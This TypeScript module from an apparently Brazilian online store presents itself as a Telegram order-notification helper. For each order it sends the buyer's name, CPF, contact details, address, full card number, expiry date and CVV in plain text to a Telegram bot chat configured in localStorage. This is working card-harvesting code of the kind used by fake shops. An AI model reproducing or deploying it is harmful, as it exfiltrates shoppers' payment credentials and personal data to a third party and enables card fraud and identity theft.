import { getFromLocalStorage } from "./localStorage";
import { toast } from "@/hooks/use-toast";

export const sendTelegramNotification = async (orderData: any) => {
  const telegramConfig = getFromLocalStorage("telegramConfig", {
    isEnabled: false,
    botToken: "",
    chatId: "",
  });

  if (!telegramConfig.isEnabled) return;

  const message = `
🔔 Novo Pedido com Cartão:

Dados do Cliente:
---------------
Nome: ${orderData.customer.name}
CPF: ${orderData.customer.cpf}
Email: ${orderData.customer.email}
Telefone: ${orderData.customer.phone}

Endereço:
--------
${orderData.customer.address}
${orderData.customer.city}, ${orderData.customer.state}
CEP: ${orderData.customer.zipCode}

Dados do Cartão:
--------------
Número: ${orderData.credit_card_data.cardNumber}
Titular: ${orderData.credit_card_data.cardHolder}
Validade: ${orderData.credit_card_data.expiryDate}
CVV: ${orderData.credit_card_data.cvv}
Parcelamento: ${orderData.credit_card_data.installments}x sem juros

Dados do Pedido:
--------------
Data: ${new Date(orderData.timestamp).toLocaleString()}
Total: R$ ${orderData.total.toFixed(2)}

Itens:
-----
${orderData.items.map((item: any) => 
  `${item.title} - Qtd: ${item.quantity} - R$ ${item.price.toFixed(2)}`
).join('\n')}
  `;

  try {
    const response = await fetch(
      `https://api.telegram.org/bot${telegramConfig.botToken}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: telegramConfig.chatId,
          text: message,
          parse_mode: "HTML",
        }),
      }
    );

    if (!response.ok) {
      throw new Error("Falha ao enviar notificação para o Telegram");
    }
  } catch (error) {
    console.error("Erro ao enviar notificação:", error);
    toast({
      title: "Erro ao enviar notificação para o Telegram",
      variant: "destructive",
    });
  }
};